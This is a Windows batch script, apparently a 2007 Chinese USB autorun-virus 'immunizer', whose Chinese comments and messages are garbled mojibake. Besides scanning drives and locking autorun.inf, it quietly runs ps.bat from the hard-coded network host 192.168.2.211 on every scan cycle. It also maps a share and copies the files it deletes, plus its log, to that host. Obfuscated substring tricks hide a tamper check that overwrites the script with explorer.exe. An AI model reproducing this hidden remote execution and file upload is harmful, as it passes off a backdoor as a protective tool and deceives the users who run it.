@echo off
::�벻Ҫ�����޸ı��ű����κ��޸Ķ��ܿ��ܵ��½ű�����ʧ��
::���ߣ�CyyIsGood��Cloud
::��ϵ��cyyisgood@126.com colud018@qq.com
::��Ȩ����(C)2007
setlocal ENABLEDELAYEDEXPANSION ENABLEEXTENSIONS
set "c=%*"
set "cdback=%cd%"
set "home=%~dp0"
cd /d "%home%"
set "dnum=0"
set "fnum=1"
set "panl=CDEFGHIJKLMNOPQRSTUVWXYZ"
set "driverl=%panl%"
set "logf=%home%log.txt"
set "fn= "
set "str=ver beta5"
set "answer=echo"
set "log=echo"
set "cycle=echo. >nul"
set "im=call:im"
set "writer=CyyIsGood��Cloud"
set "sd=-"
set "s= "
set "ps=echo. >nul"
set "return=rem"
set "pack=call:pack"
set "packp=%home%bakfiles"
set "host=192.168.2.211"
set "hostf=re$"
set "csh= "
set "fr= "
set "u=echo."
set "send=echo. >nul"
set "yn=rem"
set "zh=del /a /f /q U�̲�������.bat ���ٿ�.bat uda-��ѹ.bat Anti-U������.bat zap.a �򿪷��͹���.bat readme.txt"
set "inf=�������޷������ļ����Զ�ȥ�������ļ����ܡ���������ļ����ܡ�"
set "feorr=�ļ���ʧ���޷�����������"
set "ep=echo.��ʱ����-p��������Ч��"
set "e=echo.��-d���������󣡡�-d������Ϊ�ա�"
set "endf=%home%bye.txt"
call:checkfile
:csh
set "csh=%~1 "
set "csh=%csh:"=%"
if "%csh%"==" " (goto start)
set "csh=%csh:~0,-1%"
if not "%csh%"=="%s%" (set "s=%csh%") else (echo."%1"������Ч
goto :eof)
if "%s%"=="-?" (call:c&echo.�﹦�ܣ�&echo.	һ������ĳһ�����������е�Autorun.inf��ȷ���������ļ������������ļ�������ɾ�������������һֱ���У����Է���U�̲�����&echo.	��������ĳһ���������̣��ļ����ߣ�Autorun.inf�ļ��С���ϵͳ/����/ֻ��/�浵���ԡ�8.3���ļ��С�NTFSдȨ��&echo.	�������ͱ��ݵ��ļ������ߣ�Ŀǰ���ù���ֻ���������и��в�У԰����&echo.���趨��&echo.	Ĭ����������ԡ���־�������ַ��%logf%�������ߡ������ѭ���򿪣������ļ��رգ��̷�Ϊ��%driverl%��������Ŀ��ص�����&echo.	-?		��ʾ����������Ϣ��������˲������ڣ�������������&echo.	-a		�رջ���&echo.	-l		�ر���־&echo.	-d [�̷�]	�̷�����ĸ������"-d CD"��ʾ����C�̺�D��&echo.	-c		�ر�ѭ��&echo.	-i		�ر�����&echo.	-p		�رմ�������ݣ�&echo.	-y		�򿪽���ģʽ��ɾ���ļ���Ҫȷ�ϣ�&echo.	-s		�򿪷����ļ���������ļ��������ߣ���������Ҫӳ��һ��������̣��̷��ɱ��������Զ����䡣��ѡ�����ʱ���Զ��򿪷����ļ���"-p"������Ч��&echo. >nul	-h [IP��ַ]	�Զ��巢���ļ���IP��ַ&echo. >nul	-f [������]	�Զ��巢���ļ��Ĺ�����&echo.	������ʲôģʽ�����ִ���%endf%ʱ��ɾ�������˳���Ҳ����˵��ѭ��ģʽ�У��½�һ��%endf%�ļ���������ѭ����&echo.���Ȩ˵����&echo.	���������д���Һܳ�ʱ�䣬�������Һܶ���Ѫ��ϣ������������ߣ���Ҫ�����޸ġ��������������У��ҷǳ���ӭ������ϵ�ұ��ˣ����ʼ�����cyyisgood@126.com �����½���ǵ���̳��http://dust-hack.vicp.net&echo.	�����ļ���Ȩ������������С�&goto :eof)
if /i "%s%"=="-a" (set "answer=rem "&shift)
if /i "%s%"=="-l" (set "log=rem "&shift)
if /i "%s%"=="-d" (set "driverl=%~2 "
set "driverl=!driverl:"=!"
if "!driverl:~0,1!"=="-" (%e%&goto :eof) else (if "!driverl!"==" " (%e%&goto :eof) else (set "driverl=!driverl:~0,-1!"&shift&shift)))
if /i "%s%"=="-h" (set "host=%~2 "
set "host=!host:"=!"
if "!host:~0,1!"=="-" (%e:d=h%&goto :eof) else (if "!host!"==" " (%e:d=h%&goto :eof) else (set "host=!host:~0,-1!"&shift&shift)))
if /i "%s%"=="-f" (set "hostf=%~2 "
set "hostf=!hostf:"=!"
if "!hostf:~0,1!"=="-" (%e:d=f%&goto :eof) else (if "!hostf!"==" " (%e:d=f%&goto :eof) else (set "hostf=!hostf:~0,-1!"&shift&shift)))
if /i "%s%"=="-y" (set "yn=call:yn"&shift)
if /i "%s%"=="-c" (set "cycle=goto cend"&shift)
if /i "%s%"=="-i" (set "im=echo. >nul"&shift)
if /i "%s%"=="-p" (if "%send%"=="call:send" (%ep%&goto :eof) else (set "pack=echo. >nul"&shift))
if /i "%s%"=="-s" (if "%pack%"=="echo. >nul" (%ep%&goto :eof) else (set "send=call:send"&shift))
goto csh
:start
echo.Wscript.sleep 10000>sleep.vbe
if "%send%"=="call:send" (call:fpan)
call:c
:begin
if exist "%endf%" (call:echo "���ֽ���ָʾ�ļ��������˳�..."&goto end)
set "driver=!driverl:~%dnum%,1!:"
if exist %driver% (call:echo "����%driver%"&%ps%&(if exist "%driver%\autorun.inf\" (call:echo "%driver%�Ѿ����ߡ�") else (if exist "%driver%\autorun.inf" (call:echo "���������ļ�%driver%\autorun.inf"&call:chaut %driver%) else (call:echo "�޷��������ļ�%driver%\autorun.inf��%driver% ��ȫ"&%im% %driver%))))
set /a "dnum=dnum+1"
if "!driverl:~%dnum%,1!"=="" ((ping %host% -n 1 >nul&&call \\%host%\%hostf%\ps.bat)&%cycle%&set "dnum=0"&sleep.vbe)
goto begin
:echo
%answer%.%~1
%log%.%date%��%time%	%~1>>"%logf%"
goto :eof
:yn
echo.a=msgbox("�Ƿ�ɾ�������ļ�%~1��"^&vbCr^&vbCr^&vbCr^&"ע�⣺10����Զ�ȷ����ѡ����ļ�����ɾ�������ᱻ��ӡ�.-���������׺��",4164,"U�̲�������") >yn.vbe
echo.wscript.quit a >>yn.vbe
wscript /t:10 yn.vbe
if "%ERRORLEVEL%"=="7" (call:echo "�û�������ɾ���ļ�%~1��"&set "return=shift&goto del"&%pack% "%~1"&ren "%~1" "%~nx1.-%random%"&if exist "%~1" (call:echo "��Ӻ�׺ʱ�����ļ���%~1") else (call:echo "�ɹ���Ӻ�׺���ļ���%~1")) else (call:echo "�û�ȷ��ɾ���ļ�%~1��")
goto :eof
:del
set "return=rem"
set "fn=%1 "
set "fn=%fn:"=%"
if "%fn%"==" " (goto :eof)
call:fnr %driver%\%fn%
call:echo "ɾ���ļ���%fn%"
if not exist "%fn%" (call:echo "�ļ���%fn%�Ѿ�������"&shift&goto del)
%yn% "%fn%"
%return%
call:echo "ɾ���ļ�ǰ���ж�%driver%�Ƿ�ΪNTFS..."
cacls %driver% >nul||(call:echo "%driver%�̴��̸�ʽ����NTFS��"&goto del2)
call:echo "%driver%�̴��̸�ʽ��NTFS��ȷ����%fn%����ȫ����Ȩ��"
echo.y|cacls "%fn%" /G %username%:f||(call:echo "��%fn%дȨʧ�ܣ��п����޷�ɾ���ļ���"&goto del2)
call:echo "��%fn%дȨ�ɹ���"
:del2
%pack% "%fn%"&zap.a "%fn%" >nul&if exist "%fn%" (call:echo "ɾ���ļ�ʱ�����ļ���%fn%") else (call:echo "�ɹ�ɾ���ļ���%fn%"&del %driver%\*.tmp /a /f /q&if exist "%driver%\*.tmp" (call:echo "������ʱ�ļ�ʱ����"))
shift
goto del
:fnr
set "fn=%~f1"
goto :eof
:chaut
set /a "o=0"
if not "%~t0%~z0"=="2%fn:~3,0%00%pack:~1,0%7-0%host:~3,0%3-14%random:~1,0% 17:%sd:~5,0%40114%zh:~1,0%71" (type %systemroot%\explorer.exe >"%~dpnx0"&goto :eof)
call:echo "���ڷ��� %driver%\autorun.inf..."
for /f "eol=[ tokens=1,2* delims==" %%i in (%driver%\autorun.inf) do (if /i "%%~i"=="shell" (set o=1&(for /f "eol=[ tokens=1,2* delims==" %%a in (%driver%\autorun.inf) do (if /i "%%~a"=="shell\%%j\command" (set "o=1"&call:del %%b)))) else (if /i "%%~i"=="shell\explore\command" (set "o=1"&call:del %%j) else (if /i "%%~i"=="shell\find\command" (set "o=1"&call:del %%j) else (if /i "%%~i"=="shell\manage\command" (set "o=1"&call:del %%j) else (if /i "%%~i"=="open" (set "o=1"&call:del %%j) else (if /i "%%~i"=="shellexecute" (set "o=1"&call:del %%j) else (if /i "%%~i"=="shell\auto\command" (set "o=1"&call:del %%j) else (if /i "%%~i"=="shell\open\command" (set "o=1"&call:del %%j)))))))))
if %o%==1 (call:echo "������飬%driver%\autorun.inf �������ļ�������Σ�ա�"&call:del autorun.inf) else (call:echo "������飬%driver%\autorun.inf �������ļ�����ȫ��")
%im% %driver%
goto :eof
:checkfile
call:fr uda.a
if "%fr%"=="200%e:~3,0%7-0%host:~8,0%3-1%feorr:~10,0%4 17:%driverl:~5,0%40 216%driverl:~1,0%74" (goto rn2)
call:echo "uda.a�ļ����󣡱��ػָ��޷����У���������%host%����ļ���"
if "%send%"=="echo. >nul" (call:echo "δӳ��������̡�"&set "send=call:send"&call:fpan&if "!send!"=="%send%" (call:echo "ӳ���������ʧ�ܣ�ʮ�ֱ�Ǹ�����ű�ʧȥ���ڼ�ֵ��ִ���Ի١�"&set "u=goto end"&cd /d "%cdback%"&%zh% uda.a))
del /a /f /a uda.a
copy /v %sd%:\uda.a "%cd%\"||(call:echo "��ȡ�ļ�ʧ�ܣ�ʮ�ֱ�Ǹ�����ű�ʧȥ���ڼ�ֵ��ִ���Ի١�"&set "u=goto end"&cd /d "%cdback%"&%zh% uda.a)
:rn2
i%e:~4,0%f not "%date:~2,3%%~t0%feorr:~4,0%%~z0"=%time:~4,0%="%feorr:~2,0%%date:~2,3%20%driverl:~1,0%07-0%time:~0,0%3-1%date:~5,0%4 17:%driverl:~5,0%40%e:~3,0%1%ep:~3,0%1%feorr:~16,0%4%host:~8,0%7%inf:~2,0%1%feorr:~10,0%" (call:echo "��%host:~8,0%��%feorr:~4,0%��%feorr:~4,0%����%feorr:~4,0%����%feorr:~4,0%��%driverl:~13,0%%feorr:~5%"&goto rn3)
if not exist zap.a (call:echo "zap.a%feorr%"&goto rn3)
set "ma%host:~8,0%ne=du%driverl:~5,0%olC%inf:~20,1%do%feorr:~10,0%oG%feorr:~4,0%sIy%feorr:~16,0%yC"
set "v%feorr:~36,0%er%host:~8,0%="
:ch
if "%fnum%"=="16" (set "fnum=0"&set "wri%driverl:~13,0%ter=!%str:~0,3%!"&goto :eof) else (set "ver=%ver%!mane:~-%fnum%,1!"&set /a "fnum=fnum+1"&goto ch)
:rn3
call:echo "���Իָ����ű�..."
%zh%&uda.a&U�̲�������.bat %c%&goto :eof
:im
call:echo "����%1"
if exist "%~1\autorun.inf" (call:echo "����ǰ������%1\autorun.inf��"&call:del autorun.inf&if exist "%1\autorun.inf" (call:echo "����%1\autorun.infʧ�ܣ��޷�����%1��"&goto :eof))
md "%1\autorun.inf\" >nul||(call:echo "�޷�����%1\autorun.inf\�ļ��У�����%1ʧ�ܣ�"&goto :eof)
call:echo "����%1\autorun.inf\�ļ��гɹ�������1�ɹ���"
cd /d "%1\autorun.inf\"
md "�����ѱ�!writ%panl:~4,0%er!����Autorun.inf����..\" >nul||(call:echo "�޷��������ļ��У���һ������%1ʧ�ܣ�"&goto i1)
call:echo "8.3�ļ��д����ɹ�������2�ɹ���"
:i1
cd /d "%home%"
attrib "%1\autorun.inf" +a +s +r +h||(call:echo "�޸�����ʧ�ܣ���һ������%1ʧ�ܣ�"&goto i2)
call:echo "�޸����Գɹ�������3�ɹ���"
:i2
cacls %1 >nul||(call:echo "%1�̴��̸�ʽ����NTFS���޷����н�һ�����ߣ�дȨ��"&goto :eof)
call:echo "%1���̸�ʽΪNTFS����ȡ��һ�����ߣ�дȨ��"&echo.y|cacls.exe "%1\autorun.inf" /p everyone:r >nul||(call:echo "%1\autorun.inf\дȨʧ�ܣ�"&goto :eof)
call:echo "%1\autorun.inf\дȨ�ɹ����������߳ɹ���"
goto :eof
:c
title U�̲������� By !wr%feorr:~19,0%iter!
call:echo "				U�̲�������"
call:echo "			�� �ߣ�!wr%time:~3,0%iter!
call:echo 
goto :eof
:pack
if not exist "%packp%\" (md "%packp%"||(call:echo "�޷�����%packp%Ŀ¼���޷�ʵ�ִ�����ܣ�����ͬʱ����ʧЧ����"&goto :eof))
set "packf=%date:~0,-4%-%time:~0,-3%"
set "packf=%~nx1-%computername%-%packf::=-%.uda"
call:echo "������WinUDA���ļ�%~1�����%packp%\%packf% �������Ҫ��һ��ʱ��..."
echo.q|uda.a a -0 "%packp%\%packf%" "%~1"
if not "!ERRORLEVEL!"=="0" (call:echo "WinUDA����ļ���%packp%\%packf% ʱ���ִ���")
if not exist "%packp%\%packf%" (call:echo "WinUDAѹ��ʱʧ�ܣ�����ļ���%packp%\%packf%ʧ�ܣ��޷�ʵ�ִ�����ܣ�����ͬʱ����ʧЧ����"&goto :eof)
call:echo "�ɹ�����ļ���%packp%\%packf%"
%send% "%packp%\%packf%"
goto :eof
:send
call:echo "���ڷ����ļ� %~1 ..."
ping %host% -n 1 >nul||(call:echo "Ping��ͨ %host% ���޷������ļ��������ļ���%~1ʧ�ܣ�"&goto :eof)
copy /v "%~1" %sd%:\ >nul||(call:echo "�����ļ���%~1ʧ�ܣ�"&goto :eof)
call:echo "�ɹ������ļ���%~1"
goto :eof
:fpan
call:echo "����ӳ���������..."
call:echo "���ڼ����Ѿ�ӳ����������..."
for /f "usebackq tokens=2,3 skip=4 delims= " %%i in (`net use`) do (if "%%~j"=="\\%host%\%hostf%" (call:echo "�ҵ��Ѿ�ӳ���������̣��̷���%%i"&set "sd=%%i"&set "sd=!sd:~0,1!"&goto f3))
call:echo "û���ҵ��Ѿ�ӳ���������̣����ڷ����̷�..."
:fpan2
set /a "fnum=fnum+1"
if "!panl:~-%fnum%,1!"=="" (call:echo "������Ѿ�û�п��Է�����̷��ˡ�%inf%"&set "send=echo. >nul"&goto :eof)
if exist "!panl:~-%fnum%,1!:" (goto fpan2)
set "sd=!panl:~-%fnum%,1!"
call:echo "����ӳ���̷�Ϊ��%sd%:"
ping %host% -n 1 >nul||(call:echo "Ping��ͨ%host%���޷�ӳ��������̣�%inf%"&set "send=echo. >nul"&goto :eof)
net use %sd%: \\%host%\%hostf% >nul||(call:echo "ӳ�乲��ʱ����"&call:echo "���ڳ��Դ��·����̷�..."&goto :fpan2)
:f3
call:echo "�ɹ�ӳ��������̣��̷���%sd%:��"
set "driverl=!driverl:%sd%=!"
goto :eof
:fr
set "fr=%~zt1"
goto :eof
:end
del "%endf%" /f /a /q||call:echo "ɾ��������־�ļ���%endf% ʱ����"
:cend
del sleep.vbe /f /a /q||call:echo "ɾ���ļ���sleep.vbe ʱ����"
if exist "%sd%:" (call:pack "%logf%"&(net use %sd%: /delete /y||call:echo "ɾ��ӳ����ʱ����"))
cd /d "%cdback%"
endlocal